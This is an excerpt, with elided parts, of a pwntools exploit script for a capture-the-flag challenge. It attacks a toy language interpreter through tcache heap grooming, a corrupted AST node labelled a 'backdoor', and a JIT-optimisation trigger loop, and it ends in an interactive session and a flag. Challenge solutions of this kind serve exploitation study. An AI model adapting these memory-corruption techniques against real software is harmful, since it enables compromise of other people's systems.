...
def main():
    with connect() as tube:
        ...
        # Fix up pwn2's ASTBinaryExprNode to activate the backdoor.
        backdoor = b'backdoor'
        ...
        # Immediately assigning the modified pwn2_bytes to s will allocate it a
        # new buffer, which we don't want. Return its buffer to tcache first.
        prompt(tube)
        tube.sendline(f'set s = "{drop_ballast_val}";')
        if args.LOCAL and not args.VALGRIND:
            tube.gdb.interrupt_and_wait()
            print(tube.gdb.execute('heap bins', False, True))
            tube.gdb.continue_nowait()

        # Now free a bunch of ballast chunks so that s gets the buffer we
        # returned to tcache before. This time we will put the backdoor
        # activator into it.
        for _ in range(5):
            drop_ballast()
        prompt(tube)
        ...
        # Optimize pwn2() and activate the backdoor!
        prompt(tube)
        tube.sendline('set i = 0;')
        prompt(tube)
        tube.sendline('while (i < 1001) { var x: int = pwn2(); set i = i + 1; }')

        tube.interactive()  # ASIS{n3v3r_f0rg3t_2_us3_c0py_c9nstruct0r!!!}
